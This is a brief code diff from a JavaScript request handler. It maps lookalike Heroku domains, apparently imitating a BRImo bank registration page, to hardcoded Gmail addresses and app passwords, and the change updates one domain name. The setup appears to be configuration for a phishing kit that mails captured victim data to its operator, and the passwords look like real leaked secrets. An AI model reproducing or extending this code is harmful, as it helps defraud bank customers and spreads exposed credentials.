@@ -64,7 +64,7 @@ export default function handler(req, res) {
         pass = 'fzntnluddmuahidw';
        
     }
-    else if (url == 'daftarr-bri-mo.herokuapp.com'){
+    else if (url == 'daftarrr-bri-mo.herokuapp.com'){
         email = 'namakuubri@gmail.com';
         pass = 'acfrtsnasoaccdnt';
            
